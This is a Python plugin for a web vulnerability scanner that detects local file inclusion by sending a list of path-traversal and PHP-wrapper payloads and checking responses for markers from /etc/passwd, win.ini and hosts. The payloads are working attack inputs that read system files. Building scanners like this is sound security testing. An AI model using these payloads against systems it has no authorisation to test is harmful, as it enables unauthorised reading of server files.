"""Local File Inclusion (LFI) audit plugin."""

from __future__ import annotations

import asyncio
from typing import Any

import structlog

from xfweb.core.plugins.plugin_base import AuditPlugin
from xfweb.core.net.http_engine import HttpEngine

logger = structlog.get_logger()

LFI_PAYLOADS = [
    ("../../etc/passwd", ["root:", "/bin/bash", "/bin/sh"]),
    ("../../etc/passwd%00", ["root:"]),
    ("....//....//etc/passwd", ["root:"]),
    ("/etc/passwd", ["root:"]),
    ("..%2f..%2f..%2fetc/passwd", ["root:"]),
    ("..%252f..%252f..%252fetc/passwd", ["root:"]),
    ("php://filter/convert.base64-encode/resource=/etc/passwd", ["cm9vd"]),
    ("php://input", []),
    ("../../windows/system32/drivers/etc/hosts", ["localhost"]),
    ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", ["localhost"]),
]

WIN_LFI_PAYLOADS = [
    ("../../windows/win.ini", ["[fonts]", "[extensions]"]),
    ("..\\..\\..\\windows\\win.ini", ["[fonts]"]),
]


class LfiPlugin(AuditPlugin):
    """Local File Inclusion vulnerability detector."""

    plugin_name = "lfi"
    brief_description = "Detect local file inclusion (LFI) vulnerabilities"

    async def audit(self, freq: Any, http: HttpEngine) -> None:
        params = self._extract_params(freq)
        if not params:
            return

        tasks = []
        for param_name, param_value in params.items():
            tasks.append(self._test_param(freq, param_name, param_value, http))
        await asyncio.gather(*tasks, return_exceptions=True)

    def _extract_params(self, freq: Any) -> dict[str, str]:
        params: dict[str, str] = {}
        if freq.post_data and isinstance(freq.post_data, str):
            for pair in freq.post_data.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        if freq.url.query:
            for pair in freq.url.query.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        return params

    async def _test_param(self, freq: Any, param: str, value: str, http: HttpEngine) -> None:
        all_payloads = LFI_PAYLOADS + WIN_LFI_PAYLOADS

        for payload, markers in all_payloads:
            modified_url = freq.url.raw_url.replace(
                f"{param}={value}",
                f"{param}={payload}",
            )
            resp = await http.get(modified_url)

            if resp.status_code == 200 and any(marker in resp.text for marker in markers):
                logger.warning(
                    "xfweb.lfi.vuln_found",
                    url=freq.url.raw_url,
                    param=param,
                    payload=payload,
                )
                return
